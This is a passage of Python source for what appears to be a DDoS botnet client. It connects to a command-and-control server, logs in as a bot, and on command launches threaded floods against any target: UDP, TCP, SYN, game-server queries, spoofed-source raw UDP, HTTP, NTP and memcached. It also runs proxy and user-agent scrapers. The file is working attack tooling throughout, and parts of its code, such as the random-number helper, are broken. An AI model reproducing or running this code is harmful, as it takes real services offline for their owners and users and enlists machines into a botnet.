            url_encoded_data = f'{random.choice(keywords)}={random.choice(keywords)}'
            
            # Add more key-value pairs randomly
            for _ in range(random.randint(0, 12)):
                if random.randint(0, 1) == 1:
                    url_encoded_data += f'&{random.choice(keywords)}={random.choice(keywords)}'
            
            # Update headers for POST request
            headers.update({
                'Content-Type': 'application/x-www-form-urlencoded', 
                'Content-Length': str(len(url_encoded_data))
            })
            
            # Generate random path
            random_path = ""
            for _ in range(random.randint(1, 3)):
                random_path += random.choice(keywords) + "/"
            
            target_url = f"http{'s' if port == '443' else ''}://{ip}/{random_path}"
            
            # Send POST request
            session.post(target_url, headers=headers, data=url_encoded_data, 
                        verify=False, timeout=(5, 2), allow_redirects=False, stream=False)
        except:
            pass

def attack_udp(ip, port, secs, size):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        data = random._urandom(size)
        s.sendto(data, (ip, dport))

def attack_tcp(ip, port, secs, size):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            while time.time() < secs:
                s.send(random._urandom(size))
        except:
            pass

def attack_SYN(ip, port, secs):
    
    while time.time() < secs:
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        flags = 0b01000000
        
        try:
            s.connect((ip, port))
            pkt = struct.pack('!HHIIBBHHH', 1234, 5678, 0, 1234, flags, 0, 0, 0, 0)
            
            while time.time() < secs:
                s.send(pkt)
        except:
            s.close()

def attack_tup(ip, port, secs, size):
    while time.time() < secs:
        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        dport = random.randint(1, 65535) if port == 0 else port
        try:
            data = random._urandom(size)
            tcp.connect((ip, port))
            udp.sendto(data, (ip, dport))
            tcp.send(data)
            print('Pacote TUP Enviado')
        except:
            pass

def attack_hex(ip, port, secs):
    payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def attack_vse(ip, port, secs):
    payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                b'\x20\x51\x75\x65\x72\x79\x00') # Read more here > https://developer.valvesoftware.com/wiki/Server_queries    
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))


def attack_roblox(ip, port, secs, size):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(size)
        dport = random.randint(1, 65535) if port == 0 else port
        for _ in range(1500):
            ran = random.randrange(10 ** 80)
            hex = "%064x" % ran
            hex = hex[:64]
            s.sendto(bytes.fromhex(hex) + bytes, (ip, dport))

def attack_junk(ip, port, secs):
    payload = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def attack_udp_priv(ip, port, secs):
    # Serangan UDP dengan paket besar (15000 bytes) untuk mencapai throughput tinggi
    # Berdasarkan kode 10gbpsUDP.py
    port = int(port)
    randport = (True if port == 0 else False)
    end_time = time.time() + int(secs)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Buat paket berukuran besar (15000 bytes) untuk optimal throughput
    bytes_payload = random._urandom(15000)
    
    # Lakukan serangan sampai waktu habis
    while time.time() < end_time:
        if randport:
            port = random.randint(1, 65535)
        sock.sendto(bytes_payload, (ip, port))

def attack_ovh(ip, port, secs, size):
    # IP class array dari kode C untuk IP spoofed
    ip_class = [2372231209,2728286747,1572769288,3339925505,2372233279,3254787125,1160024353,2328478311,
                3266388596,3238005002,1745910789,3455829265,1822614803,3355015169,3389792053,757144879]
    
    # Fungsi utama untuk OVH attack yang menggunakan IP spoofing dari array dan payload custom
    PHI = 0xaaf219b9
    Q = [0] * 4096
    c = 362436
    
    # Init random generator seperti pada kode C
    def init_rand(x):
        Q[0] = x
        Q[1] = x + PHI
        Q[2] = x + PHI + PHI
        for i in range(3, 4096):
            Q[i] = Q[i-3] ^ Q[i-2] ^ PHI ^ i
    
    # Custom CMWC random generator dari kode C
    def rand_cmwc():
        a = 18782
        i = 4095
        i = (i + 1) & 4095
        t = a * Q[i] + c
        c = (t >> 32)
        x = t + c
        if x < c:
            x += 1
            c += 1
        Q[i] = 0xfffffffe - x
        return Q[i]
    
    # Persiapan untuk serangan
    init_rand(int(time.time()))
    
    # Mulai serangan
    end_time = time.time() + int(secs)
    while time.time() < end_time:
        try:
            # Buat socket RAW untuk custom IP header
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            # Pilih IP spoofed dari array
            spoofed_ip = socket.inet_ntoa(struct.pack('!L', ip_class[random.randint(0, len(ip_class)-1)]))
            
            # Persiapan packet dengan payload acak
            packet_size = random.randint(500, int(size))
            payload = os.urandom(packet_size)
            
            # Buat packet dengan IP header dan UDP header
            udp_port = random.randint(1, 65535) if int(port) == 0 else int(port)
            packet = IP(src=spoofed_ip, dst=ip) / UDP(sport=random.randint(1, 65535), dport=udp_port) / Raw(load=payload)
            
            # Kirim packet
            send(packet, verbose=0)
        except:
            pass
            
def main():
        c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        while 1:
            try:
                c2.connect((KRYPTONC2_ADDRESS, KRYPTONC2_PORT))
                while 1:
                    c2.send('669787761736865726500'.encode())
                    break
                while 1:
                    time.sleep(1)
                    data = c2.recv(1024).decode()
                    if 'Username' in data:
                        c2.send('BOT'.encode())
                        break
                while 1:
                    time.sleep(1)
                    data = c2.recv(1024).decode()
                    if 'Password' in data:
                        c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                        break
                break
            except:
                time.sleep(5)
        while 1:
            try:
                data = c2.recv(1024).decode().strip()
                if not data:
                    break
                args = data.split(' ')
                command = args[0].upper()

                if command == 'PING':
                    c2.send('PONG'.encode())
                
                elif command == '.UDP' or command == 'UDP':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    for _ in range(threads):
                        threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()

                elif command == '.TCP' or command == 'TCP':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    for _ in range(threads):
                        threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()

                elif command == '.TUP' or command == 'TUP':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    for _ in range(threads):
                        threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()
                    for _ in range(threads):
                        threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()

                elif command == '.HEX' or command == 'HEX':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    threads = int(args[4])

                    for _ in range(threads):
                        threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
                
                elif command == '.ICMP' or command == 'ICMP':
                    ip = args[1]
                    secs = time.time() + int(args[2])
                    threads = int(args[3])
                    
                    for _ in range(threads):
                        threading.Thread(target=icmp, args=(ip, secs), daemon=True).start()
                
                elif command == '.POD' or command == 'POD':
                    ip = args[1]
                    secs = time.time() + int(args[2])
                    threads = int(args[3])
                    
                    for _ in range(threads):
                        threading.Thread(target=pod, args=(ip, secs), daemon=True).start()

                elif command == '.VSE' or command == 'VSE':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    threads = int(args[4])

                    for _ in range(threads):
                        threading.Thread(target=attack_vse, args=(ip, port, secs), daemon=True).start()
                
                elif command == '.HTTPGET' or command == 'HTTPGET':
                    ip = args[1]
                    port = args[2]
                    secs = time.time() + int(args[3])
                    thread_count = int(args[4])

                    for _ in range(thread_count):
                        threading.Thread(target=GET_attack, args=(ip, port, secs), daemon=True).start()

                elif command == '.HTTPIO' or command == 'HTTPIO':
                    ip = args[1]
                    secs = time.time() + int(args[2])

                    for _ in range(10):
                        threading.Thread(target=httpio, args=(ip, secs), daemon=True).start()
                
                elif command == '.HTTPSTORM' or command == 'HTTPSTORM':
                    ip = args[1]
                    secs = time.time() + int(args[2])
                    thread_count = int(args[3])
                    
                    for _ in range(thread_count):
                        threading.Thread(target=STORM_attack, args=(ip, secs), daemon=True).start()
                
                elif command == '.NTP' or command == 'NTP':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    threads = int(args[4])

                    for _ in range(threads):
                        threading.Thread(target=NTP, args=(ip, port, secs), daemon=True).start()
                
                elif command == '.MEM' or command == 'MEM':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    threads = int(args[4])

                    for _ in range(threads):
                        threading.Thread(target=MEM, args=(ip, port, secs), daemon=True).start()
                
                elif command == '.ROBLOX' or command == 'ROBLOX':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    for _ in range(threads):
                        threading.Thread(target=attack_roblox, args=(ip, port, secs, size), daemon=True).start()
                
                elif command == '.JUNK' or command == 'JUNK':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    threads = int(args[4])

                    for _ in range(threads):
                        threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
                
                elif command == '.SYN' or command == 'SYN':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    threads = int(args[4])

                    for _ in range(threads):
                        threading.Thread(target=attack_SYN, args=(ip, port, secs), daemon=True).start()
                
                elif command == '.HTTPSPOOF' or command == 'HTTPSPOOF':
                    url = args[1]
                    secs = time.time() + int(args[2])
                    thread_count = int(args[3])

                    for _ in range(thread_count):
                        threading.Thread(target=httpSpoofAttack, args=(url, secs), daemon=True).start()
                
                elif command == '.OVH' or command == 'OVH':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    for _ in range(threads):
                        threading.Thread(target=attack_ovh, args=(ip, port, secs, size), daemon=True).start()

                elif command == '.UDP-PRIV' or command == 'UDP-PRIV':
                    ip = args[1]
                    port = args[2]
                    secs = time.time() + int(args[3])
                    threads = int(args[4])

                    for _ in range(threads):
                        threading.Thread(target=attack_udp_priv, args=(ip, port, secs), daemon=True).start()

                elif command == '.HTTP-DDOSGUARD' or command == 'HTTP-DDOSGUARD':
                    ip = args[1]
                    port = args[2]
                    secs = time.time() + int(args[3])
                    threads = int(args[4])

                    for _ in range(threads):
                        threading.Thread(target=DDOSGUARD_attack, args=(ip, port, secs), daemon=True).start()
                        
                elif command == '.HTTP-GHEADPOST' or command == 'HTTP-GHEADPOST':
                    ip = args[1]
                    port = args[2]
                    secs = time.time() + int(args[3])
                    threads = int(args[4])

                    for _ in range(threads):
                        threading.Thread(target=GHEADPOST_attack, args=(ip, port, secs), daemon=True).start()
                        
                elif command == '.HTTP-HEX' or command == 'HTTP-HEX':
                    ip = args[1]
                    port = args[2]
                    secs = time.time() + int(args[3])
                    threads = int(args[4])

                    for _ in range(threads):
                        threading.Thread(target=HEX_attack, args=(ip, port, secs), daemon=True).start()
                        
                elif command == '.HTTP-HEAD' or command == 'HTTP-HEAD':
                    ip = args[1]
                    port = args[2]
                    secs = time.time() + int(args[3])
                    threads = int(args[4])

                    for _ in range(threads):
                        threading.Thread(target=HEAD_attack, args=(ip, port, secs), daemon=True).start()
                        
                elif command == '.HTTP-MDR' or command == 'HTTP-MDR':
                    ip = args[1]
                    port = args[2]
                    secs = time.time() + int(args[3])
                    threads = int(args[4])

                    for _ in range(threads):
                        threading.Thread(target=MDR_attack, args=(ip, port, secs), daemon=True).start()

                elif command == '.HTTP-POST' or command == 'HTTP-POST':
                    ip = args[1]
                    port = args[2]
                    secs = time.time() + int(args[3])
                    threads = int(args[4])

                    for _ in range(threads):
                        threading.Thread(target=POST_attack, args=(ip, port, secs), daemon=True).start()
                
                elif command == '.PROXY-SCRAPER' or command == 'PROXY-SCRAPER':
                    proxy_type = "all"
                    if len(args) > 1:
                        if args[1].lower() in ["http", "socks4", "socks5"]:
                            proxy_type = args[1].lower()
                    
                    # Jalankan proxy scraper
                    threading.Thread(target=scrape_proxies, args=(proxy_type,), daemon=True).start()
                    c2.send(f"[+] Started proxy scraper for {proxy_type.upper()} proxies".encode())
                
                elif command == '.UA-SCRAPER' or command == 'UA-SCRAPER':
                    # Jalankan user agent scraper
                    threading.Thread(target=scrape_user_agents, daemon=True).start()
                    c2.send("[+] Started user agent scraper".encode())
                
            except:
                break

        c2.close()

        main()

if __name__ == '__main__':
        try:
            main()
        except:
            pass
